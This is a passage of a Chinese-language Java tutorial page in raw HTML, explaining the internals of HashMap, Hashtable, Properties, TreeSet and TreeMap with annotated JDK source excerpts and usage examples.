class="hljs-number">1</span>; <span class="hljs-comment">// double threshold</span><br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (oldThr &gt; <span class="hljs-number">0</span>) <span class="hljs-comment">// 不进入</span><br>        newCap = oldThr;<br>    <span class="hljs-keyword">else</span> &#123;               <span class="hljs-comment">// 进入，初始化</span><br>        newCap = DEFAULT_INITIAL_CAPACITY; <span class="hljs-comment">//默认16</span><br>        newThr = (<span class="hljs-type">int</span>)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (newThr == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-type">float</span> <span class="hljs-variable">ft</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>)newCap * loadFactor;<br>        newThr = (newCap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; (<span class="hljs-type">float</span>)MAXIMUM_CAPACITY ?<br>                  (<span class="hljs-type">int</span>)ft : Integer.MAX_VALUE);<br>    &#125;<br>    threshold = newThr;<br>    <span class="hljs-meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br>    Node&lt;K,V&gt;[] newTab = (Node&lt;K,V&gt;[])<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>[newCap]; <span class="hljs-comment">//第一次创建的核心代码 </span><br>    table = newTab; <span class="hljs-comment">//table从null扩容为16</span><br>    <span class="hljs-comment">/*** 以下省略 ***/</span><br></code></pre></td></tr></table></figure><p>③添加重复值，替换</p><p>直接看putVal():</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> V <span class="hljs-title function_">putVal</span><span class="hljs-params">(<span class="hljs-type">int</span> hash, K key, V value, <span class="hljs-type">boolean</span> onlyIfAbsent,</span><br><span class="hljs-params">               <span class="hljs-type">boolean</span> evict)</span> &#123;<br>    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="hljs-type">int</span> n, i;<br>    <span class="hljs-keyword">if</span> ((tab = table) == <span class="hljs-literal">null</span> || (n = tab.length) == <span class="hljs-number">0</span>)<br>        n = (tab = resize()).length;<br>    <span class="hljs-keyword">if</span> ((p = tab[i = (n - <span class="hljs-number">1</span>) &amp; hash]) == <span class="hljs-literal">null</span>)<br>        tab[i] = newNode(hash, key, value, <span class="hljs-literal">null</span>);<br>    <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">//由于hash计算table对应的索引位置不为空，进入该项</span><br>        Node&lt;K,V&gt; e; K k; <span class="hljs-comment">//新建Node e;k=&quot;java&quot;</span><br>      <span class="hljs-comment">//如果table的索引位置的key的hash和新的key的hash值相同，</span><br>      <span class="hljs-comment">//并且满足（table现有的节点的key和准备添加的key是同一个对象） || equals返回真），就认为不能加入新的k-v</span><br>        <span class="hljs-keyword">if</span> (p.hash == hash &amp;&amp;<br>            ((k = p.key) == key || (key != <span class="hljs-literal">null</span> &amp;&amp; key.equals(k))))<br>            e = p; <span class="hljs-comment">// 新建的e指向p</span><br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (p <span class="hljs-keyword">instanceof</span> TreeNode) <span class="hljs-comment">//判断当前的table已有的Node是否为红黑树，如果是，按照红黑树的方式添加</span><br>                e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(<span class="hljs-built_in">this</span>, tab, hash, key, value);<br>            <span class="hljs-keyword">else</span> &#123;  <br>              <span class="hljs-comment">//如果找到的节点，后面是链表，就循环比较（可见之前的详细分析）</span><br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">binCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; ; ++binCount) &#123;<br>                    <span class="hljs-keyword">if</span> ((e = p.next) == <span class="hljs-literal">null</span>) &#123;<br>                        p.next = newNode(hash, key, value, <span class="hljs-literal">null</span>);<br>                        <span class="hljs-keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD - <span class="hljs-number">1</span>) <span class="hljs-comment">// -1 for 1st</span><br>                            treeifyBin(tab, hash);<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (e.hash == hash &amp;&amp;<br>                        ((k = e.key) == key || (key != <span class="hljs-literal">null</span> &amp;&amp; key.equals(k))))<br>                        <span class="hljs-keyword">break</span>;<br>                    p = e;<br>                &#125;<br>            &#125;<br>        <span class="hljs-keyword">if</span> (e != <span class="hljs-literal">null</span>) &#123; <span class="hljs-comment">//e不为空</span><br>            <span class="hljs-type">V</span> <span class="hljs-variable">oldValue</span> <span class="hljs-operator">=</span> e.value;  <span class="hljs-comment">//oldValue 指向第一个java的value（10）</span><br>            <span class="hljs-keyword">if</span> (!onlyIfAbsent || oldValue == <span class="hljs-literal">null</span>)  <span class="hljs-comment">//onlyIfAbsent为false，所以进入该条件</span><br>                e.value = value; <span class="hljs-comment">//替换，e的value指向新的value（20）</span><br>            afterNodeAccess(e);<br>            <span class="hljs-keyword">return</span> oldValue;<br>        &#125;<br>    &#125;<br>    ++modCount;<br>    <span class="hljs-keyword">if</span> (++size &gt; threshold)<br>        resize();<br>    afterNodeInsertion(evict);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>“java”的值替换为20.</p><h2 id="12-Hashtable-amp-Properties"><a href="#12-Hashtable-amp-Properties" class="headerlink" title="12.Hashtable&amp;Properties"></a>12.Hashtable&amp;Properties</h2><h3 id="1）Hashtable"><a href="#1）Hashtable" class="headerlink" title="1）Hashtable"></a>1）Hashtable</h3><h4 id="基本介绍-4"><a href="#基本介绍-4" class="headerlink" title="基本介绍"></a>基本介绍</h4><ol><li>存放的元素是键值对：即K-V</li><li>hashtable的<strong>键和值都不能为null</strong>，否则会抛出NullPointerException</li><li>hashTable 使用方法基本上和HashMap一样</li><li>hashTable <strong>是线程安全</strong>的(synchronized)，hashMap 是线程不安全的</li></ol><p><strong>HashMap和Hashtable的比较：</strong></p><table><thead><tr><th></th><th>版本</th><th>线程安全（同步）</th><th>效率</th><th>允许null键null值</th></tr></thead><tbody><tr><td>HashMap</td><td>1.2</td><td>不安全</td><td>高</td><td>可以</td></tr><tr><td>Hashtable</td><td>1.0</td><td>安全</td><td>较低</td><td>不可以</td></tr></tbody></table><h4 id="应用案例"><a href="#应用案例" class="headerlink" title="应用案例"></a>应用案例</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Hashtable</span> <span class="hljs-variable">table</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>table.put(<span class="hljs-string">&quot;john&quot;</span>,<span class="hljs-number">100</span>); <span class="hljs-comment">//ok</span><br>table.put(<span class="hljs-literal">null</span>,<span class="hljs-number">100</span>); <span class="hljs-comment">//抛出空指针异常</span><br>table.put(<span class="hljs-string">&quot;john&quot;</span>,<span class="hljs-literal">null</span>); <span class="hljs-comment">//抛出空指针异常</span><br>table.put(<span class="hljs-string">&quot;lucy&quot;</span>,<span class="hljs-number">100</span>); <span class="hljs-comment">//ok</span><br>table.put(<span class="hljs-string">&quot;lic&quot;</span>,<span class="hljs-number">100</span>); <span class="hljs-comment">//ok</span><br>table.put(<span class="hljs-string">&quot;lic&quot;</span>,<span class="hljs-number">80</span>); <span class="hljs-comment">//替换</span><br><br><span class="hljs-comment">//简单说明一下Hashtable的底层</span><br><span class="hljs-comment">//1．底层有数组 Hashtable＄Entry［］ 初始化大小为11</span><br><span class="hljs-comment">//2．临界值 threshold 8＝11＊0.75</span><br><span class="hljs-comment">//3.按照自己的扩容机制进行扩容</span><br><span class="hljs-comment">//执行 方法addEntry(int hash, K key, V value, int index) 将K-V 封装到Entry</span><br><span class="hljs-comment">//当if (count &gt;= threshold)满足时，就进行扩容</span><br><span class="hljs-comment">//按照int newCapacity = (oldCapacity &lt;&lt; 1) + 1; 的大小进行扩容</span><br></code></pre></td></tr></table></figure><p> addEntry分析：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addEntry</span><span class="hljs-params">(<span class="hljs-type">int</span> hash, K key, V value, <span class="hljs-type">int</span> index)</span> &#123;<br>    modCount++;<br><br>    Entry&lt;?,?&gt; tab[] = table;<br>    <span class="hljs-keyword">if</span> (count &gt;= threshold) &#123; <span class="hljs-comment">//是否到临界值，满足则进行扩容</span><br>        <span class="hljs-comment">// Rehash the table if the threshold is exceeded</span><br>        rehash(); <span class="hljs-comment">//调用rehash() [详细见rehash分析]</span><br><br>        tab = table;<br>        hash = key.hashCode();<br>        index = (hash &amp; <span class="hljs-number">0x7FFFFFFF</span>) % tab.length;<br>    &#125;<br><br>    <span class="hljs-comment">// Creates the new entry.</span><br>    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>    Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;) tab[index];<br>    tab[index] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>&lt;&gt;(hash, key, value, e);<br>    count++;<br>&#125;<br></code></pre></td></tr></table></figure><p>Rehash()分析:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rehash</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">oldCapacity</span> <span class="hljs-operator">=</span> table.length; <span class="hljs-comment">//</span><br>    Entry&lt;?,?&gt;[] oldMap = table;<br><br>    <span class="hljs-comment">// overflow-conscious code</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">newCapacity</span> <span class="hljs-operator">=</span> (oldCapacity &lt;&lt; <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>; <span class="hljs-comment">//oldCapacity × 2 + 1 = 11*2+1  （2倍+1的大小扩容）</span><br>    <span class="hljs-keyword">if</span> (newCapacity - MAX_ARRAY_SIZE &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (oldCapacity == MAX_ARRAY_SIZE)<br>            <span class="hljs-comment">// Keep running with MAX_ARRAY_SIZE buckets</span><br>            <span class="hljs-keyword">return</span>;<br>        newCapacity = MAX_ARRAY_SIZE;<br>    &#125;<br>    Entry&lt;?,?&gt;[] newMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>&lt;?,?&gt;[newCapacity];<br><br>    modCount++;<br>    threshold = (<span class="hljs-type">int</span>)Math.min(newCapacity * loadFactor, MAX_ARRAY_SIZE + <span class="hljs-number">1</span>);<br>    table = newMap;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> oldCapacity ; i-- &gt; <span class="hljs-number">0</span> ;) &#123;<br>        <span class="hljs-keyword">for</span> (Entry&lt;K,V&gt; old = (Entry&lt;K,V&gt;)oldMap[i] ; old != <span class="hljs-literal">null</span> ; ) &#123;<br>            Entry&lt;K,V&gt; e = old;<br>            old = old.next;<br><br>            <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> (e.hash &amp; <span class="hljs-number">0x7FFFFFFF</span>) % newCapacity;<br>            e.next = (Entry&lt;K,V&gt;)newMap[index];<br>            newMap[index] = e;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2）properties"><a href="#2）properties" class="headerlink" title="2）properties"></a>2）properties</h3><h4 id="基本介绍-5"><a href="#基本介绍-5" class="headerlink" title="基本介绍"></a>基本介绍</h4><ol><li><p>Properties类继承自Hashtable类并且实现了Map接口，也是使用一种<strong>键值对的</strong>形式来保存数据。</p></li><li><p>他的使用特点和Hashtable类似</p></li><li><p>Properties 还可以用于 从 xxx.properties 文件中，加载数据到Properties类对象，并进行读取和修改</p></li><li><p>说明：工作后 xxx.properties 文件通常作为配置文件，这个知识点在IO流举例，有兴趣可先看文章</p><blockquote><p>cnblogs.com&#x2F;xudong-bupt&#x2F;p&#x2F;3758136.html</p></blockquote></li></ol><h4 id="常用方法及案例"><a href="#常用方法及案例" class="headerlink" title="常用方法及案例"></a>常用方法及案例</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Properties</span> <span class="hljs-variable">properties</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br><span class="hljs-comment">//properties 继承了 Hashtable；可以通过k-v存放数据，但key和value都不能为null</span><br><br><span class="hljs-comment">//增加</span><br>properties.put(<span class="hljs-string">&quot;john&quot;</span>, <span class="hljs-number">100</span>); <span class="hljs-comment">//k-v</span><br>properties.put(<span class="hljs-string">&quot;lucy&quot;</span>, <span class="hljs-number">100</span>);<br><span class="hljs-comment">// properties.put(null,100); //抛出空指针异常</span><br><span class="hljs-comment">// properties.put(&quot;john&quot;,null); //抛出空指针异常</span><br>properties.put(<span class="hljs-string">&quot;lic&quot;</span>, <span class="hljs-number">100</span>);<br>properties.put(<span class="hljs-string">&quot;lic&quot;</span>, <span class="hljs-number">80</span>); <span class="hljs-comment">//替换</span><br>System.out.println(<span class="hljs-string">&quot;properties=&quot;</span> + properties);<br><span class="hljs-comment">//输出：properties=&#123;john=100, lic=80, lucy=100&#125;</span><br><br><span class="hljs-comment">//通过key获取对应值</span><br>System.out.println(properties.get(<span class="hljs-string">&quot;lic&quot;</span>)); <span class="hljs-comment">//80</span><br><br><span class="hljs-comment">//删除</span><br>properties.remove(<span class="hljs-string">&quot;lic&quot;</span>);<br>System.out.println(<span class="hljs-string">&quot;properties=&quot;</span> + properties);<br><span class="hljs-comment">//输出：properties=&#123;john=100, lucy=100&#125;</span><br><br><span class="hljs-comment">//修改</span><br>properties.put(<span class="hljs-string">&quot;john&quot;</span>, <span class="hljs-string">&quot;约翰&quot;</span>);<br>System.out.println(<span class="hljs-string">&quot;properties=&quot;</span> + properties);<br><span class="hljs-comment">//输出：properties=&#123;john=约翰, lucy=100&#125;</span><br></code></pre></td></tr></table></figure><h2 id="13-TreeSet-amp-TreeMap"><a href="#13-TreeSet-amp-TreeMap" class="headerlink" title="13.TreeSet&amp;TreeMap"></a>13.TreeSet&amp;TreeMap</h2><h3 id="1）TreeSet"><a href="#1）TreeSet" class="headerlink" title="1）TreeSet"></a>1）TreeSet</h3><ol><li>当我们使用无参构造器，创造TreeSet时，仍然是无序的</li><li>希望添加的元素，按照字符串大小来排序</li><li>使用treeset提供的一个构造器，可以传入一个比较器（匿名内部类），并指定排序规则</li></ol><p>案例分析：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//1.当我们使用无参构造器，创造TreeSet时，仍然是无序的</span><br><span class="hljs-comment">//2.希望添加的元素，按照字符串大小来排序</span><br><span class="hljs-comment">//3.使用treeset提供的一个构造器，可以传入一个比较器（匿名内部类）</span><br><span class="hljs-comment">//  并指定排序规则</span><br><br><span class="hljs-type">TreeSet</span> <span class="hljs-variable">treeSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeSet</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>() &#123;<span class="hljs-comment">//①</span><br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Object o1, Object o2)</span> &#123;<br>  <span class="hljs-keyword">return</span> ((String)o1).compareTo((String)o2);<br>&#125;<br>&#125;);<br>treeSet.add(<span class="hljs-string">&quot;jack&quot;</span>);<br>treeSet.add(<span class="hljs-string">&quot;tom&quot;</span>);<br>treeSet.add(<span class="hljs-string">&quot;sp&quot;</span>);<br>treeSet.add(<span class="hljs-string">&quot;a&quot;</span>);<br>System.out.println(<span class="hljs-string">&quot;treeSet=&quot;</span>+ treeSet);<br></code></pre></td></tr></table></figure><p>①.构造器把传入的比较器对象，赋给了 TreeSet的底层 TreeMap的属性this.comparator</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//构造器</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">TreeSet</span><span class="hljs-params">(Comparator&lt;? <span class="hljs-built_in">super</span> E&gt; comparator)</span> &#123;<br>  <span class="hljs-built_in">this</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>&lt;&gt;(comparator));<br>&#125;<br></code></pre></td></tr></table></figure><p>②添加jack，调用add()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">add</span><span class="hljs-params">(E e)</span> &#123;<br>    <span class="hljs-keyword">return</span> m.put(e, PRESENT)==<span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>再调用put，发现调用的是TreeMap下的put。</p><p>③.在调用treeSet.add(“tom”); 底层会执行（进行比较）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">Comparator&lt;? <span class="hljs-built_in">super</span> K&gt; cpr = comparator;<br><span class="hljs-keyword">if</span> (cpr != <span class="hljs-literal">null</span>) &#123; <span class="hljs-comment">//cpr就是我们传进去的匿名内部类（对象）</span><br>    <span class="hljs-keyword">do</span> &#123;<br>        parent = t;<br>      <span class="hljs-comment">//动态绑定到我们的匿名内部类（对象）compare</span><br>        cmp = cpr.compare(key, t.key);<br>        <span class="hljs-keyword">if</span> (cmp &lt; <span class="hljs-number">0</span>)<br>            t = t.left;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cmp &gt; <span class="hljs-number">0</span>)<br>            t = t.right;<br>        <span class="hljs-keyword">else</span> <span class="hljs-comment">//如果相等，即返回0，这个key就不加入</span><br>            <span class="hljs-keyword">return</span> t.setValue(value);<br>    &#125; <span class="hljs-keyword">while</span> (t != <span class="hljs-literal">null</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>若想改变排序规则，例如按照长度排序，修改匿名内部类的return即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TreeSet</span> <span class="hljs-variable">treeSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeSet</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>() &#123;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Object o1, Object o2)</span> &#123;<br><span class="hljs-keyword">return</span> ((String)o1).length()-((String)o2).length();<br>&#125;<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="2）TreeMap"><a href="#2）TreeMap" class="headerlink" title="2）TreeMap"></a>2）TreeMap</h3><p>案例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-comment">//默认的构造器，无序</span><br><span class="hljs-comment">//        TreeMap treeMap = new TreeMap();</span><br>        <span class="hljs-comment">//按照传入的k(String)的大小进行排序</span><br>        <span class="hljs-type">TreeMap</span> <span class="hljs-variable">treeMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>() &#123; <span class="hljs-comment">//①</span><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Object o1, Object o2)</span> &#123;<br>                <span class="hljs-keyword">return</span> ((String)o1).compareTo((String)o2);<br>            &#125;<br>        &#125;);<br>        treeMap.put(<span class="hljs-string">&quot;jack&quot;</span>,<span class="hljs-string">&quot;杰克&quot;</span>); <span class="hljs-comment">//②</span><br>        treeMap.put(<span class="hljs-string">&quot;tom&quot;</span>, <span class="hljs-string">&quot;汤姆&quot;</span>);<br>        treeMap.put(<span class="hljs-string">&quot;kristina&quot;</span>,<span class="hljs-string">&quot;克瑞斯提诺&quot;</span>);<br>        treeMap.put(<span class="hljs-string">&quot;smith&quot;</span>,<span class="hljs-string">&quot;斯密斯&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;treemap=&quot;</span>+treeMap);<br></code></pre></td></tr></table></figure><p>①：构造器。把传入的实现了 Comparator接口的匿名内部类（对象），传给给TreeMap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">TreeMap</span><span class="hljs-params">(Comparator&lt;? <span class="hljs-built_in">super</span> K&gt; comparator)</span> &#123;<br>    <span class="hljs-built_in">this</span>.comparator = comparator;<br>&#125;<br></code></pre></td></tr></table></figure><p>②：调用put方法</p><p>第一次添加：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">Entry&lt;K,V&gt; t = root; <span class="hljs-comment">//root为null</span><br><span class="hljs-keyword">if</span> (t == <span class="hljs-literal">null</span>) &#123;<br>    compare(key, key); <span class="hljs-comment">// type (and possibly null) check</span><br>  <span class="hljs-comment">//第一次添加的两个key是同一值，compare用于检查是否为空</span><br><br>    root = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>&lt;&gt;(key, value, <span class="hljs-literal">null</span>);<br>    size = <span class="hljs-number">1</span>;<br>    modCount++;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>以后添加：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">Comparator&lt;? <span class="hljs-built_in">super</span> K&gt; cpr = comparator;<br><span class="hljs-keyword">if</span> (cpr != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">do</span> &#123; <span class="hljs-comment">//遍历所有key，给当前key找到适当位置</span><br>        parent = t;<br>        cmp = cpr.compare(key, t.key); <span class="hljs-comment">//动态绑定到我们的匿名内部类的compara</span><br>        <span class="hljs-keyword">if</span> (cmp &lt; <span class="hljs-number">0</span>)<br>            t = t.left;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cmp &gt; <span class="hljs-number">0</span>)<br>            t = t.right;<br>        <span class="hljs-keyword">else</span> <span class="hljs-comment">//如果遍历过程中，发现准备添加的key和当前已有的key相等，就不添加</span><br>            <span class="hljs-keyword">return</span> t.setValue(value);<br>    &#125; <span class="hljs-keyword">while</span> (t != <span class="hljs-literal">null</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="开发中如何选择集合实现类"><a href="#开发中如何选择集合实现类" class="headerlink" title="*开发中如何选择集合实现类"></a>*开发中如何选择集合实现类</h2><p>在开发中，选择什么集合实现类，主要取决于业务操作特点，然后根据集合实现类特性进行选择，分析如下：</p><ol><li>先判断存储的类型（一组对象或一组键值对）</li><li>**一组对象[单列]**：Collection接口<ul><li>允许重复:List<ul><li>增删多：LinkedList ［底层维护了一个双向链表］</li><li>改查多：ArrayList ［底层维护 Object类型的可变数组］</li></ul></li><li>不允许重复：Set<ul><li>无序：HashSet ［底层是HashMap，维护了一个哈希表 即（<strong>数组＋链表＋红黑树</strong>）］</li><li>排序：TreeSet</li><li>插入和取出顺序一致：LinkedHashSet，维护数组＋双向链表</li></ul></li></ul></li><li><strong>一组键值对</strong>：Map<ul><li>键无序:HashMap ［底层是：哈希表 jdk7:数组＋链表，jdk8:数组＋链表＋红黑树］</li><li>键排序：TreeMap</li><li>键插入和取出顺序一致:LinkedHashMap</li><li>读取文件 Properties</li></ul></li></ol><h2 id="14-Collections工具类"><a href="#14-Collections工具类" class="headerlink" title="14.Collections工具类"></a>14.Collections工具类</h2><h3 id="Collections工具类介绍"><a href="#Collections工具类介绍" class="headerlink" title="Collections工具类介绍"></a>Collections工具类介绍</h3><p>Collections是一个操作Set、List和Map等集合的工具类。</p><p>Collections 中提供了一系列静态的方法对集合元素进行排序、查询和修改等操作</p><h3 id="测试案例"><a href="#测试案例" class="headerlink" title="测试案例"></a>测试案例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">List</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>list.add(<span 